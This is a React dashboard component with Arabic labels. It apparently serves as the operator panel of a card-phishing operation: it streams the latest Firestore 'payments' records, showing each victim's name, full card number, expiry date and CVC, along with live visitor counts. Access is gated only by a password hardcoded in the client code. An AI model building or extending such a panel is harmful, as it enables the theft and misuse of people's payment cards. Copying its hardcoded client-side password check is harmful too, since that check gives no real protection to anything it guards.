"use client"

import { useEffect, useState } from 'react'
import { collection, query, orderBy, limit, onSnapshot } from 'firebase/firestore'
import { ref, onValue } from 'firebase/database'
import { db, rtdb } from '@/lib/firebase'
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from './ui/input'

interface Payment {
  id: string
  cardName: string,
  cardNumber:string,
  expiryMonth:string,
  expiryYear:string,
  cvc:string,
  verified:string,
  timestamp: { seconds: number; nanoseconds: number }
}

export default function Dashboard() {
  const [payments, setPayments] = useState<Payment[]>([])
  const [visitorCount, setVisitorCount] = useState(0)
  const [onlineVisitors, setOnlineVisitors] = useState(0)
  const [pass, setPass] = useState('')

  useEffect(() => {
    const q = query(collection(db, 'payments'), orderBy('timestamp', 'desc'), limit(5))
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      const paymentsData = querySnapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as Payment[]
      setPayments(paymentsData)
    })

    const visitorCountRef = ref(rtdb, 'visitorCount')
    const onlineVisitorsRef = ref(rtdb, 'onlineVisitors')

    onValue(visitorCountRef, (snapshot) => {
      setVisitorCount(snapshot.val() || 0)
    })

    onValue(onlineVisitorsRef, (snapshot) => {
      setOnlineVisitors(snapshot.val() || 0)
    })

    return () => {
      unsubscribe()
    }
  }, [])

  return (
    <>
    {pass === '212995'?
    <>
    <div className="space-y-4">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">إجمالي الزوار</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{visitorCount}</div>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">الزوار المتصلون</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{onlineVisitors}</div>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">إجمالي المدفوعات</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{payments.length}</div>
          </CardContent>
        </Card>
      </div>
      <Card>
        <CardHeader>
          <CardTitle>آخر المدفوعات</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-8">
            {payments.map((payment) => (
              <div key={payment.id} className="flex items-center">
                <div className="mr-4 space-y-1">
                  <p className="text-sm font-medium leading-none">{payment.cardName}</p>
                  <p className="text-sm font-medium leading-none">{payment.cardNumber}</p>
                  <p className="text-sm font-medium leading-none">{payment.expiryYear+"/"+payment.expiryMonth}</p>
                  <p className="text-sm font-medium leading-none">{payment.cvc}</p>
                  <p className="text-sm font-medium leading-none text-red-500">{payment.verified}</p>
                  <p className="text-sm text-muted-foreground">
                    {new Date(payment.timestamp.seconds * 1000).toLocaleString('ar-EG')}
                  </p>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
    </>:<div>
      <Input onChange={(e)=>setPass(e.target.value)} type='text' />
    </div>
    }
    </>
  )
}

